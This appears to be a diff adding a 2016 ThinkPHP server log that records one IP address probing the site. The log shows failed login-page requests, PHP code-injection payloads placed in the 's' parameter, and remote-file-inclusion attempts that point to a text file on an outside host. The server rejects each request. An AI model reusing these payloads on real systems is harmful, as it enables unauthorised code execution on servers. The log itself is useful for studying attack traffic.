@@ -1,0 +1,63 @@
+[ 2016-04-25T05:14:35+08:00 ] 121.42.0.14 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001072s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001413s ]
+ERR: 无法加载模块:Public
+
+[ 2016-04-25T05:14:58+08:00 ] 121.42.0.14 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001128s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001486s ]
+ERR: 无法加载模块:Public
+
+[ 2016-04-25T05:16:24+08:00 ] 121.42.0.14 /index.php?m=Public&a=login
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001098s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001448s ]
+ERR: 无法加载模块:Public
+
+[ 2016-04-25T05:25:31+08:00 ] 121.42.0.14 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001090s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001434s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2016-04-25T05:25:40+08:00 ] 121.42.0.14 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001754s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002286s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2016-04-25T05:25:42+08:00 ] 121.42.0.14 /index.php?s=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001142s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001508s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();
+
+[ 2016-04-25T05:25:44+08:00 ] 121.42.0.14 /index.php?s=http://120.26.55.211/s.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001185s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001526s ]
+ERR: 无法加载模块:Http:
+
+[ 2016-04-25T05:25:47+08:00 ] 121.42.0.14 /index.php?s=http%3A%2F%2F120.26.55.211%2Fs.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001149s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001553s ]
+ERR: 无法加载模块:Http:
+
+[ 2016-04-25T05:25:51+08:00 ] 121.42.0.14 /index.php?s=a_long_name_file_not_exist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001105s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001454s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
